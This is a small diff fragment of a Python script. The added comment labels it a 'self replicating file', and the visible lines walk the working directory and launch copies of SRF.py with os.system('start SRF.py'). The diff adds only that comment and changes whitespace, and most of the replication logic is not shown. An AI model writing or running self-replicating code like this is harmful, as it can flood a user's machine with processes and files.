@@ -1,3 +1,4 @@
+#SRF stand for self replicating file
 import time
 import os
 A=os.getcwd()
@@ -21,8 +22,7 @@ for i in os.listdir(os.getcwd()):
                 os.system("start SRF.py")
         except:
                 print("nope")
-
-        
+             
 
 
 
